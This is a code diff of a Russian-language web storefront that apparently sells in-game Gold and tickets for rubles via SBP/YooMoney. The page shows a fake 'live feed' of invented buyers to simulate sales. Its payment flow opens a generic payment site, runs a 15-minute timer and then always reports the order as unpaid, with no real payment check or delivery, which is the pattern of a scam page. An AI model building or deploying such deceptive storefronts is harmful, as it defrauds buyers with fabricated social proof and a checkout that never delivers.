@@ -22,7 +22,7 @@
         .header h1 { margin: 0; font-size: 1.1rem; letter-spacing: 2px; text-transform: uppercase; color: var(--accent); }
 
         .tabs { display: flex; justify-content: center; gap: 5px; margin: 10px 0; padding: 0 10px; }
-        .tab-btn { background: var(--card); border: 1px solid #444; color: #888; padding: 8px; border-radius: 6px; cursor: pointer; text-transform: uppercase; font-size: 0.6rem; flex: 1; text-align: center; transition: 0.3s; }
+        .tab-btn { background: var(--card); border: 1px solid #444; color: #888; padding: 8px; border-radius: 6px; cursor: pointer; text-transform: uppercase; font-size: 0.6rem; flex: 1; text-align: center; }
         .tab-btn.active { border-color: var(--accent); color: white; background: rgba(255, 140, 0, 0.2); }
 
         .container { max-width: 450px; margin: 0 auto; padding: 0 10px; height: 60vh; overflow-y: auto; scrollbar-width: none; }
@@ -38,16 +38,17 @@
         .price { color: var(--accent); font-weight: 800; font-size: 1rem; }
 
         /* КОМПАКТНАЯ ЛЕНТА */
-        .live-feed { position: fixed; bottom: 80px; left: 15px; width: 220px; z-index: 1000; pointer-events: none; }
+        .live-feed { position: fixed; bottom: 90px; left: 15px; width: 180px; z-index: 1000; pointer-events: none; }
         .feed-item { 
-            background: rgba(15, 15, 20, 0.95); border-left: 3px solid var(--accent); 
-            padding: 6px 10px; border-radius: 6px; font-size: 0.65rem; margin-top: 5px; 
+            background: rgba(10, 10, 15, 0.98); border-left: 3px solid var(--accent); 
+            padding: 5px 10px; border-radius: 4px; font-size: 0.6rem; margin-top: 5px; 
             display: flex; align-items: center; justify-content: space-between; 
-            animation: slideIn 0.3s ease-out; opacity: 1; transition: 0.5s;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.5); opacity: 0; transform: translateX(-20px);
+            transition: opacity 0.4s, transform 0.4s;
         }
-        @keyframes slideIn { from { opacity: 0; transform: translateX(-20px); } to { opacity: 1; transform: translateX(0); } }
+        .feed-item.show { opacity: 1; transform: translateX(0); }
 
-        .cart-toggle { position: fixed; top: 15px; right: 15px; background: var(--accent); color: black; width: 40px; height: 40px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; cursor: pointer; z-index: 2000; font-size: 0.9rem; }
+        .cart-toggle { position: fixed; top: 15px; right: 15px; background: var(--accent); color: black; width: 40px; height: 40px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; cursor: pointer; z-index: 2000; }
         
         #cart-modal { position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 3000; display: none; backdrop-filter: blur(10px); }
         .cart-content { max-width: 380px; margin: 30px auto; background: #16171a; border-radius: 20px; padding: 20px; border: 1px solid #333; position: relative; min-height: 400px; display: flex; flex-direction: column; }
@@ -69,9 +70,9 @@
 
 <div class="container">
     <div class="tabs">
-        <div class="tab-btn active" id="tab-gold" onclick="showTab('gold')">Gold</div>
-        <div class="tab-btn" id="tab-tickets" onclick="showTab('tickets')">Билеты</div>
-        <div class="tab-btn" id="tab-pass" onclick="showTab('pass')">Season Pass</div>
+        <div class="tab-btn active" onclick="switchTab(this, 'gold')">Gold</div>
+        <div class="tab-btn" onclick="switchTab(this, 'tickets')">Билеты</div>
+        <div class="tab-btn" onclick="switchTab(this, 'pass')">Season Pass</div>
     </div>
 
     <div class="user-input-box">
@@ -83,7 +84,7 @@
         <div id="active-promos" style="font-size: 0.6rem; color: var(--success); margin-top: 4px;"></div>
     </div>
 
-    <!-- GOLD -->
+    <!-- ТОВАРЫ -->
     <div id="gold" class="services active">
         <div class="option" onclick="addToCart('100 Gold', 89)"><h3>100 Gold</h3><div class="price">89 ₽</div></div>
         <div class="option" onclick="addToCart('500 Gold', 373)"><h3>500 Gold</h3><div class="price">373 ₽</div></div>
@@ -91,22 +92,19 @@
         <div class="option" onclick="addToCart('3000 Gold', 1935)"><h3>3000 Gold</h3><div class="price">1935 ₽</div></div>
     </div>
 
-    <!-- TICKETS -->
     <div id="tickets" class="services">
         <div class="option" onclick="addToCart('100 Билетов', 89)"><h3>100 Билетов</h3><div class="price">89 ₽</div></div>
         <div class="option" onclick="addToCart('500 Билетов', 369)"><h3>500 Билетов</h3><div class="price">369 ₽</div></div>
     </div>
 
-    <!-- PASS (ЗАГЛУШКА) -->
     <div id="pass" class="services">
         <div class="locked-info">
-            <h2>ВРЕМЕННО НЕДОСТУПНО</h2>
-            <p>Раздел на тех. обслуживании. Попробуйте позже.</p>
+            <h2>РАЗДЕЛ ЗАКРЫТ</h2>
+            <p>Технические работы. Доступ появится в следующем обновлении.</p>
         </div>
     </div>
 </div>
 
-<!-- КОРЗИНА -->
 <div id="cart-modal">
     <div class="cart-content">
         <div id="step-cart">
@@ -115,23 +113,17 @@
             <div style="border-top:1px solid #333; padding-top:10px; display:flex; justify-content:space-between; margin-bottom:20px;">
                 <span>Итого:</span><b id="total-price" style="color:var(--accent)">0 ₽</b>
             </div>
-            <div style="border:1px solid var(--accent); padding:10px; border-radius:10px; text-align:center; background:rgba(255,140,0,0.05); margin-bottom:15px;">
-                <img src="https://upload.wikimedia.org" width="50" style="filter:brightness(2)">
-            </div>
-            <button class="pay-btn" onclick="processPayment()">ОПЛАТИТЬ ЧЕРЕЗ СБП <img src="https://upload.wikimedia.org" width="25" style="filter:brightness(0)"></button>
+            <button class="pay-btn" onclick="goToPay()">ОПЛАТИТЬ ПО СБП <img src="https://upload.wikimedia.org" width="25" style="filter:brightness(0)"></button>
             <button onclick="toggleCart()" style="width:100%; background:none; border:none; color:#555; margin-top:10px; font-size:0.7rem; cursor:pointer;">Закрыть</button>
         </div>
-
         <div id="step-waiting" style="display:none; flex-direction:column; align-items:center; justify-content:center; flex:1; text-align:center;">
             <div class="loader"></div>
             <h2 id="timer-text" style="color:var(--accent); font-size:1.5rem;">15:00</h2>
             <p style="color:#888; font-size:0.8rem;">Ожидание транзакции...</p>
         </div>
-
         <div id="step-error" style="display:none; flex-direction:column; align-items:center; justify-content:center; flex:1; text-align:center;">
             <div style="font-size: 40px; margin-bottom: 10px;">⚠️</div>
-            <h2 style="color:var(--danger); font-size:1rem;">ОШИБКА ОПЛАТЫ</h2>
-            <p style="color:#888; font-size:0.7rem;">Средства не поступили.</p>
+            <h2 style="color:var(--danger); font-size:1rem;">ТОВАР НЕ ОПЛАЧЕН</h2>
             <button class="pay-btn" onclick="location.reload()" style="margin-top:15px;">В МЕНЮ</button>
         </div>
     </div>
@@ -142,22 +134,22 @@
 <script>
     let cart = [];
     let discount = 0;
-    const yoomoneyUrl = "https://yoomoney.ru";
+    const yoomoney = "https://yoomoney.ru";
 
-    function showTab(id) {
-        document.querySelectorAll('.services').forEach(s => s.classList.remove('active'));
+    function switchTab(btn, id) {
         document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+        document.querySelectorAll('.services').forEach(s => s.classList.remove('active'));
+        btn.classList.add('active');
         document.getElementById(id).classList.add('active');
-        document.getElementById('tab-'+id).classList.add('active');
     }
 
     function addToCart(name, price) {
         if(!document.getElementById('user_id').value) return alert("Введите ID!");
         cart.push({name, price});
-        updateUI();
+        updateCart();
     }
 
-    function updateUI() {
+    function updateCart() {
         document.getElementById('cart-count').innerText = cart.length;
         const list = document.getElementById('cart-list');
         list.innerHTML = cart.map(i => `<div style="display:flex; justify-content:space-between; margin-bottom:5px;"><span>${i.name}</span><b>${i.price} ₽</b></div>`).join('');
@@ -175,24 +167,20 @@
         if(document.getElementById('promo_input').value.toUpperCase() === 'LUXURY') {
             discount = 0.15;
             document.getElementById('active-promos').innerText = "LUXURY: -15%";
-            updateUI();
+            updateCart();
         }
     }
 
-    function processPayment() {
+    function goToPay() {
         if(cart.length === 0) return;
-        window.open(yoomoneyUrl, '_blank');
+        window.open(yoomoney, '_blank');
         document.getElementById('step-cart').style.display = 'none';
         document.getElementById('step-waiting').style.display = 'flex';
-        startTimer(900);
-    }
-
-    function startTimer(t) {
-        const display = document.getElementById('timer-text');
+        let t = 900;
         const interval = setInterval(() => {
             let m = Math.floor(t / 60), s = t % 60;
-            display.textContent = `${m < 10 ? '0'+m : m}:${s < 10 ? '0'+s : s}`;
-            if (--t < 0) {
+            document.getElementById('timer-text').innerText = `${m < 10 ? '0'+m:m}:${s < 10 ? '0'+s:s}`;
+            if(--t < 0) {
                 clearInterval(interval);
                 document.getElementById('step-waiting').style.display = 'none';
                 document.getElementById('step-error').style.display = 'flex';
@@ -200,7 +188,7 @@
         }, 1000);
     }
 
-    // КОМПАКТНАЯ ЛЕНТА
+    // ЛЕНТА - 2 СЕКУНДЫ
     setInterval(() => {
         const feed = document.getElementById('live-feed');
         const names = ["Killer", "Admin", "Top_G", "Sashok", "Vortex", "Legenda"];
@@ -209,14 +197,15 @@
         el.innerHTML = `<span><b>${names[Math.floor(Math.random()*names.length)]}</b> купил Gold</span> <span style="color:var(--success)">✔</span>`;
         feed.appendChild(el);
         
-        // Удаление через 2 секунды
+        setTimeout(() => el.classList.add('show'), 100);
+        
         setTimeout(() => {
-            el.style.opacity = '0';
-            el.style.transform = 'translateX(-10px)';
+            el.classList.remove('show');
             setTimeout(() => el.remove(), 500);
-        }, 2000);
-    }, 4500);
+        }, 2000); // Ровно 2 секунды
+    }, 4000);
 </script>
 
 </body>
-</html>
+            </html>
+    
